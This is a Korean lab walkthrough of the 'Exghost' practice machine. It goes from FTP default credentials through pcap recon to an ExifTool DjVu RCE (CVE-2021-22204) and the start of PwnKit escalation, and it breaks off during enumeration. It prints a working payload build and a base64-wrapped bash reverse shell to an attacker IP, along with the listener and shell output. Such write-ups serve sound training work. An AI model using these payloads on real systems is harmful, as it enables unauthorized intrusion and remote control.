---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/ftp
  - tech/web/file-upload
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.183
domain: exghost.local
ports: [21, 80]
services: [ftp, http]
cves: [CVE-2021-22204, CVE-2021-4034]
status: solved
manual_tags: true
tech_count: 3
---
PG Practice — Pentester Foundations #7. 타겟 192.168.248.183 · OS Ubuntu 20.04 · 난이도 Fundamental · 플래그 2개.
경로 요약 — FTP 기본자격(`user:system`) → 백업 파일이 **pcap** → pcap에서 `/exiftest.php` + **ExifTool 12.23** 확인 → **CVE-2021-22204** DjVu RCE → `www-data` → **PwnKit CVE-2021-4034** → root

## 0. 이 박스에서 배우는 것

- 열거가 의도적으로 실패하도록 설계된 박스 — 30만 건 브루트포싱을 완주하고도 0건이었다. "큰 워드리스트로 안 나옴 = 없음"이 왜 틀린 추론인가를 몸으로 배운다.
- pcap 자체가 정찰 자료 — 백업 파일이 패킷 캡처였고, 거기서 엔드포인트·파라미터명·취약 버전을 통째로 얻는다. 과거 캡처는 현재 접근 불가능한 정보를 담는다.
- CVE-2021-22204 (ExifTool DjVu RCE) — 파일 파싱만으로 코드가 실행되는 취약점. 확장자가 아니라 매직 바이트로 포맷을 판별한다는 사실이 익스플로잇의 핵심이다.
- 응답 문구 차이가 열거 오라클 — `There is no file to upload.` vs `File uploaded successfully :)` 로 파라미터명을 특정한다.
- PwnKit (CVE-2021-4034) — `pkexec` 로컬 권한상승. 타겟에 컴파일러가 없을 때 파이썬 PoC를 쓰는 이유.

**시험 출제 가능성 — 매우 높다.** 이 박스가 가르치는 것은 특정 CVE가 아니라 "열거가 막혔을 때 다른 채널에서 정보를 얻는 사고방식"이다 — 이건 OSCP 시험에서 반복적으로 요구된다.
ExifTool RCE·PwnKit 자체도 2021년 이후 랩·시험 박스에 흔히 등장한다. 무엇보다 **"백업/캡처/로그 파일을 정찰 자료로 다루는 습관"**은 어떤 박스에서도 통하는 자산이다.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.183
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

22와 443은 `filtered`. 공격면은 **FTP와 웹 둘뿐**이다.

**열린 포트가 둘뿐이면 상호 연결을 의심하라.** FTP·HTTP만 열려 있고 웹 열거가 막히면(뒤에서 보듯 실제로 막힌다) **FTP가 웹으로 넘어가는 다리**일 가능성이 높다. 실제로 그랬다 — FTP의 백업 파일이 웹 엔드포인트를 알려준다.

### FTP — 기본 자격증명

브리핑은 "브루트포스"라고 하지만 **`user` / `system`** 이 한 방에 통한다. 워드리스트를 돌리기 전에 흔한 조합부터 시도하는 게 항상 이득이다.

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ ftp -A 192.168.248.183
220 (vsFTPd 3.0.3)
Name: user
Password: system
230 Login successful.
ftp> ls
-rwxrwxrwx    1 0        0          126151 Jan 27  2022 backup
```

> [!danger] PASV(패시브) 모드가 방화벽에 막혀 있다
> 기본 패시브 모드로 붙으면 `LIST`부터 타임아웃한다. 데이터 채널 포트가 전부 필터링돼 있기 때문이다.
> 액티브 모드를 강제해야 한다:
> ```bash
> ftp -A 192.168.248.183          # -A = active mode
> ```
> 파이썬이면 `ftplib.FTP.set_pasv(False)`.
> "FTP 로그인은 되는데 목록이 안 나온다" = **거의 항상 PASV/방화벽 문제**다. 자격증명을 의심하기 전에 모드를 바꿔봐라. (자세한 진단은 6장 ①)

#### 명령 플래그 해설 — `ftp -A`

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-A` | 액티브 모드 강제. 클라이언트가 `PORT` 명령으로 데이터 포트를 열고 서버가 그리로 접속 | 기본 패시브 모드가 되어 서버 지정 고번호 포트로 나가는데, 그 포트가 필터링돼 `LIST`/`RETR`이 무한 대기 |

### `backup`은 확장자만 없을 뿐 pcap이다

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ file backup
backup: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

**확장자 없는 파일은 반드시 `file`로 확인한다.** `backup`이라는 이름만 보고 tar/zip으로 넘겨짚으면 시간을 버린다. **매직 바이트가 진실**이다.
954 패킷, 144초 분량, 2022-01-27 캡처.

### 열거 — pcap이 곧 정찰 자료다

954 패킷 중 **HTTP 트랜잭션은 딱 2건**이다. 나머지 926 프레임은 Firefox/Ubuntu 배경 DNS 노이즈(`detectportal.firefox.com`, `connectivity-check.ubuntu.com` 등).

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ tshark -r backup -Y http.request -T fields -e frame.number -e http.request.method -e http.host -e http.request.uri
66	GET	127.0.0.1	/
891	POST	127.0.0.1	/exiftest.php
```

HTTP 객체를 통째로 뽑아낸다:

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ tshark -r backup --export-objects http,http_objects/
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ ls -la http_objects/
%2f              502     업로드 폼 index.html (gzip 해제됨)
exiftest.php     14806   POST 멀티파트 본문 전체
exiftest(1).php  1072    서버 응답 — ExifTool 출력
```

#### 명령 플래그 해설 — `tshark`

| 조각 | 역할 | 메모 |
|---|---|---|
| `-r backup` | 파일에서 읽기(라이브 캡처 아님) | |
| `-Y http.request` | 디스플레이 필터 — 표시할 프레임만 후처리로 걸러냄 | 캡처 필터 `-f`와 다르다. `-f`는 캡처 시점에 버려 되돌릴 수 없다 |
| `-T fields -e ...` | 지정 필드만 열로 출력 | grep보다 정확 — 프로토콜 파서가 뽑아준다 |
| `--export-objects http,DIR/` | HTTP 응답 본문을 재조립해 파일로 저장 | TCP 재조립·chunked·gzip 해제까지 자동. 아래 참조 |

**`--export-objects`가 하는 일 — 왜 이게 강력한가.** HTTP 바디는 여러 TCP 세그먼트에 쪼개지고, chunked 인코딩·gzip 압축이 걸려 있을 수 있다. `--export-objects http,dir/`는 **TCP 스트림을 재조립하고 전송 인코딩을 풀어 원래 파일 그대로** 디렉터리에 떨군다. 업로드 폼 HTML, POST 멀티파트 본문, 서버 응답이 각각 온전한 파일로 나온다.
손으로 "Follow HTTP Stream"을 반복하는 것과 결과는 같지만, 자동화되고 누락이 없다. pcap을 받으면 반사적으로 이 한 줄부터 친다.

① 업로드 폼과 파라미터명 (`%2f` = 루트 응답):

```html
<form method="post" action="exiftest.php" enctype="multipart/form-data">
    <input type="file" name="myFile" />
    <input type="submit" value="Upload">
</form>
```

② 실제 POST 요청 — 멀티파트 파트 헤더 원문:

```
POST /exiftest.php HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------169621313238602050593908562572

Content-Disposition: form-data; name="myFile"; filename="testme.jpg"
Content-Type: image/jpeg
```

③ 서버 응답 — 핵심 발견:

```
File uploaded successfully :)
ExifTool Version Number         : 12.23
File Name                       : phpopnW14.jpg
Directory                       : /var/www/html/uploads
File Size                       : 14 KiB
File Modification Date/Time     : 2022:01:27 14:47:37+02:00
```

여기서 세 가지가 동시에 나온다:

| 정보 | 값 | 의미 |
|---|---|---|
| ExifTool 버전 | **12.23** | CVE-2021-22204 취약 범위(7.44–12.23). 12.23이 취약한 마지막 버전 — 12.24에서 수정 |
| 저장 경로 | `/var/www/html/uploads` | |
| 저장 파일명 | `phpopnW14.jpg` | PHP tmp 이름(`php`+6랜덤) — 예측 불가 |
| 동작 | exiftool 출력이 응답에 그대로 반사 | 익스플로잇 성공/실패를 응답으로 즉시 확인 가능 |

**저장 파일명이 랜덤이어도 상관없다.** 보통 업로드 RCE는 "업로드한 웹셸을 다시 호출"해야 해서 저장 경로·파일명을 알아야 한다.
**CVE-2021-22204는 exiftool이 파일을 파싱하는 순간 실행**된다. 되부를 필요가 없으니 파일명 예측 불가는 장애물이 아니다.
게다가 `/uploads/`는 403이라 리스팅도 안 된다 — 파일명에 의존하는 접근이었다면 여기서 막혔을 것이다.

### 라이브 타겟 상태 확인

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ curl -s -o /dev/null -w 'exiftest.php HTTP=%{http_code}\n' http://192.168.248.183/exiftest.php
exiftest.php HTTP=200
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ curl -s -o /dev/null -w '/ HTTP=%{http_code}\n' http://192.168.248.183/
/ HTTP=403
```

**pcap 속 index.html은 개발 당시 루프백에만 있었고, 지금은 `/`가 403이다.** 업로드 폼 페이지를 거칠 수 없으니 `exiftest.php`에 직접 POST를 쏴야 한다.

**pcap이 없었다면 이 박스는 막힌다.** `/`가 403이라 브라우저로는 폼을 볼 수 없고, 디렉터리 열거로 `exiftest.php`를 찾더라도 **파라미터명 `myFile`과 ExifTool 버전 12.23**은 알 수 없다.
과거 트래픽 캡처는 현재 접근 불가능한 정보를 담고 있다. 백업·로그·캡처 파일을 발견하면 그 자체가 정찰 자료다.

### pcap에서 나오지 않은 것 (기록해둘 것)

- 평문 자격증명 없음 — `flag|passw|pwd|credential|secret|api_key|token|BEGIN PRIVATE` 스윕 결과 0건
- 쿠키·`Authorization`·`Set-Cookie` 헤더 없음
- DNS 엑스필 없음 (926개 DNS 프레임은 전부 정상 배경 트래픽, 고유 이름 10개)
- 트래픽 전부 `127.0.0.1` 루프백 — 외부 대화나 C2 없음
- 카빙한 `testme.jpg`(14582 B)는 은닉 데이터 없는 평범한 테스트 이미지. 스테가노 요소 아님

**"없다"도 결론이다.** 포렌식에서 찾지 못한 것을 명시하는 것은 환각 방지 장치다. "자격증명이 있을 것"이라고 넘겨짚고 시간을 쓰는 대신, 스윕 결과 0건을 기록하고 다음으로 넘어간다.

### 스캐너 함정 — 디렉터리 브루트포싱은 30만 건을 돌고도 실패했다

이 박스에서 가장 중요한 실측 결과다. 정찰 담당이 웹을 전수에 가깝게 긁었다:

| 스캔 | 워드리스트 | 요청 수 | 완주 | 결과 |
|---|---|---|---|---|
| ffuf 디렉터리 | `directory-list-2.3-medium.txt` | **220,560** | 100% | `uploads`(301), `server-status`(403) |
| ffuf 루트 파일 | `raft-medium-files.txt` × 5확장자 | 완주 | 100% | **200 응답 0건** |
| ffuf `/uploads/` | `raft-medium-files.txt` × 4확장자 | **85,645** | 100% | **0건** |
| 수동 추측 40개 | `exghost/ghost/exif/exiftool/upload/...` | 40 | — | 전부 404 |

**총 306,205건을 돌려서 찾은 것: 아무것도 없음.**

```
403  /              (인덱스 없음 + Options -Indexes)
301  /uploads   =>  /uploads/
403  /uploads/      (존재하나 리스팅 금지, 파일 열거 0건)
403  /server-status/
```

`Host:` 헤더를 `exghost`·`exghost.local`·`exghost.pg` 등으로 바꿔도 전부 기본 vhost 403 — 숨은 가상호스트도 없다.

**정찰 담당의 결론이 정확했다.** 웹만 본 정찰 담당은 "업로드 엔드포인트를 찾지 못했다"고 솔직하게 보고하면서, 정황(`/uploads/`만 존재 + 열린 포트가 FTP·HTTP 둘뿐 + `/uploads/` 파일 열거 0건)으로부터 **"진입 경로는 FTP일 것"**이라고 판단했다. 찾지 못한 것을 찾은 척하지 않는 것이 정확한 다음 수로 이어졌다.
왜 306,205건이 0건이었는가는 2장에서 코드 수준으로 파고든다 — 이게 이 박스의 최대 학습 포인트다.

---

## 2. 취약점 분석

이 박스에는 취약점이 둘 있다 — 진입점의 **ExifTool DjVu RCE(CVE-2021-22204)**와 권한상승의 **PwnKit(CVE-2021-4034)**. 하지만 이 박스가 진짜 가르치는 것은 그 앞에 있는 "왜 열거가 실패했는가"라는 정찰의 인식론이다. 그것부터 짚는다.

### 2-1. 왜 `exiftest.php`는 브루트포싱으로 못 찾는가 — 이 노트 최대의 자산

30만 건을 완주하고 0건이었던 이유는 화려하지 않다. `exiftest.php`가 어떤 표준 워드리스트에도 들어 있지 않기 때문이다.

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ for w in directory-list-2.3-medium.txt raft-medium-files.txt raft-large-files.txt common.txt; do
      printf '%-32s %s\n' "$w" "$(grep -ic '^exiftest' /path/to/$w)"
    done
directory-list-2.3-medium.txt    0
raft-medium-files.txt            0
raft-large-files.txt             0
common.txt                       0
```

`raft-large-files.txt` 전체에서 `exif`를 포함하는 항목은 2개뿐이고 그중 `exiftest`는 없다.

이걸 확률로 뒤집어 생각하면 명확하다. 브루트포싱의 성공 조건은 **"대상 파일명 ∈ 워드리스트"**다. 이 교집합이 비면 요청을 몇 건 보내든 결과는 0이다. 30만 건이라는 숫자는 **커버리지의 착시**를 준다 — "이만큼 돌렸으면 다 봤겠지"라는 느낌은 워드리스트 크기에 비례할 뿐, 대상 파일명이 그 목록에 들어 있을 확률과는 무관하다. `exiftest.php`는 개발자가 그날 즉흥적으로 지은 이름이라 애초에 어떤 코퍼스에도 수집된 적이 없다.

> [!danger] "충분히 큰 워드리스트로 안 나옴 = 없음"은 틀린 추론이다
> 이건 시험장에서 시간을 통째로 태우는 오류다. 워드리스트 브루트포싱은 **"흔한 이름을 가진 것"만** 찾는다. 개발자가 지어낸 커스텀 파일명(`exiftest.php`)은 30만 건을 완주해도 나오지 않는다.
> 워드리스트의 본질을 생각하면 당연하다 — 워드리스트는 **과거에 수집된 이름들의 목록**이지, 대상 서버에 실제로 존재하는 파일의 목록이 아니다. 목록에 없는 이름은 확률이 0이다.

브루트포싱이 막혔을 때 파일명을 얻는 다른 채널들 — 우선순위 순:

| 채널 | 방법 | 이 박스에서 |
|---|---|---|
| 백업·캡처·로그 | FTP/SMB/웹의 `backup`·`.pcap`·`access.log`·`.bak`·`.old` | ✅ **FTP의 pcap이 답이었다** |
| 소스 유출 | `.git/`, 노출된 zip, `.svn/`, `composer.json` | — |
| JS 번들 하드코딩 경로 | `main.js`·`app.js` 안의 `fetch('/api/...')`, `action="..."` | — |
| 에러 메시지·스택트레이스 | 디버그 페이지가 내부 경로·엔드포인트를 흘림 | — |
| `robots.txt`·`sitemap.xml` | 숨기려던 경로가 오히려 나열됨 | — |
| 앱 성격에서 유추 | "exif" 힌트 → `exif.php`·`exiftest.php`·`exiftool.php`·`testexif.php`를 직접 조합해 시도 | ✅ 40개 수동 추측(단, 여기선 실패) |
| 다른 서비스에서 넘어오기 | FTP·SMB·SSH·DB에 웹 경로가 저장돼 있음 | ✅ FTP → pcap |

**이 박스는 "열거가 실패하는 상황"을 의도적으로 설계했다.** 그래서 FTP → pcap 경로가 정석인 것이다. 열린 포트가 FTP·HTTP 둘뿐이고 웹 열거가 0건이면, 설계자는 **FTP가 웹의 정보를 담고 있도록** 박스를 짰다는 신호다. "웹에 아무것도 없다"에서 멈추지 말고 "그럼 FTP가 웹을 설명한다"로 넘어가라.

### 2-2. pcap이 곧 정찰인 이유 — 시간축이 다른 정보

라이브 타겟에서 `/`는 지금 403이다. 하지만 pcap이 캡처된 2022-01-27 시점에는 **개발자가 루프백(`127.0.0.1`)에서 폼 페이지를 열어 테스트**하고 있었고, 그때의 `GET / 200` 응답에 업로드 폼 HTML이 통째로 들어 있다.

즉 **pcap은 "과거의 서버가 지금은 안 주는 응답"을 냉동 보관**하고 있다. 라이브로는 접근 불가능한 세 가지가 캡처 안에 살아 있었다:

1. 업로드 폼 HTML → 파라미터명 `myFile`, 액션 `exiftest.php`
2. 실제 POST 멀티파트 헤더 → `filename`·`Content-Type: image/jpeg` 검증 통과 형식
3. 서버 응답에 반사된 `ExifTool Version Number : 12.23` → 취약 버전 확정

**"지금 못 보는 것"과 "과거에 보였던 것"을 구분하라.** 403·인증벽·삭제된 페이지가 현재 상태라고 해서 그 정보가 세상에서 사라진 것이 아니다. 캡처·백업·웹 아카이브·로그에는 더 관대했던 과거의 서버가 남아 있다. 이건 실무 OSINT에서도 그대로 통한다(예: `web.archive.org`).

### 2-3. 응답 문구 차이가 열거 오라클이다

폼을 못 보더라도 **파라미터명 자체를 브루트포싱**할 수 있다. `exiftest.php`가 파라미터명에 따라 다른 문구를 반환하기 때문이다.

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9' > /tmp/t.jpg
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ for n in myFile file image upload fileToUpload userfile document; do
      echo -n "$n: "; curl -s -F "$n=@/tmp/t.jpg" http://192.168.248.183/exiftest.php
    done
myFile: File uploaded successfully :)
file: There is no file to upload.
image: There is no file to upload.
...
```

**응답 문구가 달라서 파라미터명이 그대로 새어나온다.** 20바이트짜리 최소 JPEG(`FFD8FFE0...FFD9`)면 충분하다.

root 획득 후 소스를 읽어 확정:

```php
// /var/www/html/exiftest.php
if (!isset($_FILES["myFile"])) { die("There is no file to upload."); }
...
$output = shell_exec('/var/www/html/exiftool ' . $newFilepath . ' > /var/www/html/reportsexif/' . $filename.".txt");
```

MIME 화이트리스트는 `image/png`·`image/jpeg`뿐이지만, **exif 페이로드는 정상 JPEG 안에 들어가므로 이 검증을 그대로 통과한다.**

**응답이 입력에 따라 달라지는 모든 지점은 열거 오라클이다.** `There is no file to upload.` vs `File uploaded successfully :)` — 이 한 글자 차이로 파라미터명을 특정했다.
**로그인 폼의 "존재하지 않는 사용자" vs "비밀번호가 틀렸습니다"와 정확히 같은 원리**다. 사용자 열거, 파일 존재 확인, SQLi blind — 전부 이 "차이가 곧 정보"라는 한 가지 원리의 변형이다. 서버가 상태에 따라 다르게 대답하면, 그 차이를 이진 탐색으로 짜내면 된다.

**오라클을 자동화하는 법 (수동 대안).** 여기서는 파라미터 후보 7개를 `for` 루프로 돌려 응답 문구를 눈으로 비교했다. 후보가 많으면 응답을 판정식으로 바꿔 자동화한다:
```bash
while read n; do
  r=$(curl -s -F "$n=@/tmp/t.jpg" http://192.168.248.183/exiftest.php)
  case "$r" in *successfully*) echo "HIT: $n";; esac
done < params.txt
```
SQLi blind이라면 같은 골격에서 `curl`을 시간 측정(`-w %{time_total}`)이나 참/거짓 문구 grep으로 바꾸면 그대로 한 글자씩 추출하는 스크립트가 된다. **오라클의 형태(문구/시간/길이)만 다를 뿐 골격은 동일**하다.

### 2-4. 왜 `.jpg`인데 DjVu 코드가 실행되나 — CVE-2021-22204 메커니즘

**배경 — ExifTool DjVu ANT 필드 Perl 인젝션.** ExifTool은 Perl로 작성돼 있다. DjVu 이미지의 ANT(annotation) 청크를 파싱할 때, 그 내용을 Perl `eval`에 넘기는 코드 경로가 있었다. `eval`은 문자열을 **Perl 코드로 실행**하므로, ANT 필드에 `system(...)`을 심으면 파싱하는 순간 그 명령이 실행된다. 파일을 되부를 필요도, 웹셸을 심을 필요도 없다 — 읽히기만 하면 끝이다.

핵심은 **왜 확장자가 `.jpg`인데 DjVu 파서가 도는가**이다.

```
겉면(파일 헤더·확장자)  →  JPEG(FFD8...)  →  PHP의 MIME 화이트리스트(image/jpeg) 통과
속(EXIF 태그 내부)      →  DjVu ANT 청크  →  ExifTool이 매직 바이트로 찾아 파싱 → eval 실행
```

> [!danger] ExifTool은 확장자가 아니라 매직 바이트로 포맷을 판별한다
> PHP 업로드 검증은 파일의 겉(MIME/확장자)만 본다 — `image/jpeg`면 통과.
> ExifTool은 파일 내부를 재귀적으로 파싱한다 — JPEG 안에 박힌 EXIF 태그를 열고, 그 태그값이 DjVu 시그니처를 가지면 DjVu 파서로 넘긴다.
> **이 둘의 인식 차이가 취약점의 심장**이다. 겉은 정상 JPEG라 검증을 통과하고(방어를 뚫고), 속은 DjVu라 취약 코드 경로로 들어간다(공격을 성립시킨다). 하나의 파일이 두 검사자에게 서로 다른 것으로 보이게 만드는 파서 혼동(parser confusion) 계열 공격이다.

**일반화 — "검증하는 파서 ≠ 처리하는 파서"이면 우회가 생긴다.** 이 패턴은 ExifTool에 국한되지 않는다. **입구에서 검사하는 로직과 실제로 데이터를 소비하는 로직이 서로 다른 규칙으로 파일을 해석**하면 그 틈으로 페이로드가 지나간다. 예: 확장자로 막지만 내용은 실행 엔진이 파싱(폴리글롯 파일), `Content-Type`으로 막지만 라이브러리는 매직 바이트로 판단, WAF는 URL디코드 한 번 하지만 앱은 두 번 하는 이중 디코딩. "무엇이 검증하고 무엇이 실행하는가"가 다르면 항상 이 틈을 의심하라.

**왜 하필 DjVu인가 — 취약점은 ExifTool의 "쓰기" 경로에 있다.** 흔한 오해: "이미지 메타데이터를 읽기만 해도 뚫린다." 정확히는, 취약한 `eval`은 ExifTool이 DjVu ANT 청크를 파싱해 값을 만드는 과정에서 트리거된다. 그래서 페이로드를 EXIF 태그(`HasselbladExif`) 안에 DjVu로 심어, 대상 서버의 `exiftool <파일>` 호출이 그 태그를 파싱하도록 유도하는 것이다. 서버가 `exiftool`을 실행하기만 하면(여기서는 `shell_exec('/var/www/html/exiftool ...')`) 조건이 충족된다.

### 2-5. 왜 이 페이로드인가 — 조각별 해설

```bash
# 1) 페이로드 — 리버스셸을 base64로 감싸 인용 문제 제거
┌──(kali㉿kali)-[~/PG/Exghost/exif]
└─$ echo -n '(metadata "\c${system('"'"'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy85MDAxIDA+JjE=|base64 -d|bash'"'"')};")' > payload

# 2) bzz 압축 → DjVu 컨테이너로 포장
└─$ bzz payload payload.bzz
└─$ djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTz=payload.bzz

# 3) 정상 JPEG를 만들고, DjVu를 EXIF 태그에 삽입
└─$ convert -size 64x64 xc:red image.jpg
└─$ exiftool -config configfile '-HasselbladExif<=exploit.djvu' image.jpg
```

페이로드 문자열을 조각내면:

| 조각 | 역할 |
|---|---|
| `(metadata "..." )` | DjVu ANT 청크의 정상 문법 껍데기 — 파서가 여기까지는 정상으로 읽는다 |
| `\c` | ExifTool 파싱 과정의 이스케이프를 이용해 문자열 컨텍스트를 깨고 `${...}`가 코드로 평가되게 만드는 트릭 |
| `${system(...)}` | Perl 문자열 보간(interpolation) 안에서 `system()`이 실제로 호출된다. 이게 RCE의 실행 지점 |
| `echo <base64>\|base64 -d\|bash` | 리버스셸을 base64로 감싸 실행 — 따옴표·리다이렉트·슬래시가 파서 중첩을 깨지 않도록 |

내부 명령(base64 디코드 결과): `bash -i >& /dev/tcp/192.168.45.207/9001 0>&1`

#### 명령 플래그 해설 — DjVu 페이로드 빌드 파이프라인

각 줄이 왜 필요한지, 빼면 어떻게 실패하는지:

| 명령 | 역할 | 빼면 |
|---|---|---|
| `bzz payload payload.bzz` | ANT 청크를 BZZ 압축한다. DjVu의 `ANTz`(z=압축) 청크는 BZZ 형식을 요구 | 비압축 `ANTa`를 쓰거나 형식이 안 맞으면 `djvumake`가 청크를 안 받음 |
| `djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTz=payload.bzz` | 최소 DjVu 컨테이너 조립. `INFO=0,0`=더미 크기, `BGjp=/dev/null`=빈 배경, `ANTz=`에 페이로드 | `ANTz` 청크가 없으면 트리거할 취약 필드 자체가 없다 |
| `convert -size 64x64 xc:red image.jpg` | 정상 JPEG 껍데기 생성(ImageMagick). MIME 검증 통과용 겉면 | 진짜 JPEG가 아니면 PHP MIME 화이트리스트(`image/jpeg`)에서 거부 |
| `exiftool -config configfile '-HasselbladExif<=exploit.djvu' image.jpg` | 커스텀 태그 `HasselbladExif`에 DjVu 파일 내용을 통째로 삽입. `<=`는 "파일에서 태그값 읽어오기" | `-config` 없으면 커스텀 태그 미정의로 무시, `<=` 대신 `=`면 파일경로 문자열이 들어가 페이로드 아님 |

**왜 `HasselbladExif`(0xc51b) 태그인가.** 임의의 표준 EXIF 태그에 DjVu를 넣으면 크기·타입 제약에 걸린다. `0xc51b`은 Hasselblad 카메라의 벤더 태그로 **`string` 타입에 길이 제약이 느슨**해서 DjVu 바이너리를 통째로 담기 좋다. 대상 서버의 ExifTool이 이 태그를 파싱하며 안에 든 DjVu ANT 청크를 만나 `eval`을 실행한다. 태그 번호 자체는 본질이 아니고, "길이 제약 없이 바이너리를 담을 수 있는 태그"면 된다.

`configfile` (커스텀 EXIF 태그 정의 — 이게 있어야 DjVu를 태그에 넣을 수 있다):

```perl
%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => { Name => 'HasselbladExif', Writable => 'string', WriteGroup => 'IFD0' },
    },
);
1; #end
```

**왜 base64로 감싸는가 — 인용 중첩 회피.** 리버스셸 원문에는 `>`·`&`·`/`·공백이 섞여 있다. 이게 shell → curl → HTTP 멀티파트 → ExifTool eval → Perl `system()`으로 내려가며 여러 층의 인용 규칙을 통과해야 한다. 어느 한 층에서든 특수문자가 오해되면 페이로드가 깨진다.
base64는 **`[A-Za-z0-9+/=]`만** 쓰므로 어떤 인용 규칙에도 걸리지 않는다. 타겟에서 `base64 -d | bash`로 되돌린다. [[Hawat]]의 hex 리터럴, [[Exfiltrated]]의 base64 래핑과 같은 계열이다.

### 2-6. PwnKit (CVE-2021-4034) 메커니즘 — 왜 파이썬 PoC인가

**배경 — pkexec의 argv 처리 결함.** `pkexec`는 `polkit` 패키지의 SUID root 바이너리다. `main()`이 인자를 처리할 때 **`argc == 0`(인자가 하나도 없는 호출)을 고려하지 않는다.** `execve`는 `argv`가 빈 배열이어도 프로그램을 실행할 수 있는데, 이 경우 `pkexec`가 `argv[1]`을 읽으려다 범위를 벗어난 메모리(실제로는 뒤이은 `envp` 영역)를 인자로 오인한다.
공격자는 이 out-of-bounds 읽기/쓰기를 이용해 환경변수를 재도입하고(정상 경로에서는 지워지는), `GCONV_PATH`를 조작해 자신이 만든 공유 라이브러리를 root 권한으로 로드시킨다. 결과는 uid 0 셸이다. 인증도, 자격증명도 필요 없는 로컬 권한상승이다.

이 익스플로잇의 실무 함정은 전달 방식이다.

> [!danger] 타겟에 컴파일러가 없다 — 파이썬 PoC를 써라
> PwnKit의 원조 PoC는 C 익스플로잇과 악성 공유 라이브러리를 타겟에서 `gcc`로 빌드한다. 하지만 서버 박스에는 컴파일러가 없는 경우가 흔하다(이 박스도 그렇다).
> [joeammond/CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034)는 **msfvenom으로 만든 ELF 페이로드를 base64로 소스 안에 내장**하고, 파이썬이 실행 시점에 디코드해 `.so`를 메모리/디스크에 푼다. Python만 있으면 컴파일 없이 동작한다.
> 시험장 규칙: **로컬 권한상승 익스플로잇은 "타겟에 빌드 도구가 없는 경우"를 항상 대비하라.** C 전용 PoC밖에 없으면 Kali에서 정적 컴파일(`gcc -static`)해 바이너리째 전송하거나, 파이썬/셸 포팅본을 미리 확보해둔다.

---

## 3. Foothold

이 박스는 두 경로가 모두 유효하다. 정석은 FTP/pcap이지만, 웹 직행도 뚫린다.

| | FTP/pcap 경로 (의도된 정석) | 웹 직행 경로 (실제로 쓴 것) |
|---|---|---|
| 시작 | FTP `user:system` → `backup` 다운로드 | 곧바로 `/exiftest.php` |
| 파라미터명 획득 | pcap의 멀티파트 헤더에서 `myFile` | 응답 문구 차이로 브루트포싱(2-3) |
| 버전 획득 | pcap 응답의 `ExifTool Version Number : 12.23` | 업로드 성공 후 반사된 출력에서 확인 |
| 난이도 | 쉬움(정보가 다 주어짐) | 조금 더 걸리지만 자격증명 불필요 |

**정석 경로가 더 빠르지만, 웹 경로는 FTP 자격증명이 없어도 뚫린다.** 실전에서는 후자가 더 위험한 발견이다 — 인증 없이 RCE가 되는 엔드포인트가 인터넷에 노출돼 있다는 뜻이니까.

### 3-1. 업로드 → `www-data`

리스너를 먼저 띄우고(9001), 2-5에서 만든 악성 이미지를 `myFile`로 POST한다:

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ tmux new-session -d -s exg 'rlwrap nc -lvnp 9001'
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ curl -s -F 'myFile=@exif/image.jpg' http://192.168.248.183/exiftest.php
        (응답 없이 매달림)
```

> [!warning] 또 나왔다 — curl이 매달리는 것은 성공 신호
> exiftool이 리버스셸에 블록되어 PHP가 응답을 반환하지 못한다. **응답이 아니라 리스너를 봐라.** (누적 패턴은 6장 ③)

```bash
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.183] 39420
www-data@exghost:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@exghost:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@exghost:/var/www/html$ uname -a
Linux exghost 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64
```

#### 명령 플래그 해설 — foothold 유틸

| 조각 | 역할 | 빼면 |
|---|---|---|
| `curl -F 'myFile=@file'` | 멀티파트 폼 업로드. `@`는 파일 내용을 첨부(문자열이 아니라) | `@` 없으면 파일명 문자열이 그대로 전송되어 업로드 안 됨 |
| `rlwrap nc -lvnp 9001` | `rlwrap`이 리스너에 줄편집·히스토리 제공. `-lvnp` = listen/verbose/no-DNS/port | `rlwrap` 없어도 붙지만 화살표·백스페이스가 깨짐 |
| `tmux new-session -d -s exg` | 리스너를 분리(detached) 세션에 띄워 터미널을 계속 쓸 수 있게 | 없으면 리스너가 현재 터미널 점유 |
| `python3 -c 'import pty;pty.spawn("/bin/bash")'` | 비대화형 셸을 PTY로 업그레이드 — `sudo`·`su`·탭완성·시그널 처리 가능 | 없으면 `su`/`sudo`가 "must be run from a terminal"로 실패 |

---

## 4. 권한상승 — PwnKit (CVE-2021-4034)

### 4-1. 열거 — 취약 버전 확인

```bash
www-data@exghost:/var/www/html$ pkexec --version
pkexec version 0.105
www-data@exghost:/var/www/html$ dpkg -l | grep policykit
hi  policykit-1  0.105-26ubuntu1.1  amd64  framework for managing administrative policies and privileges
```

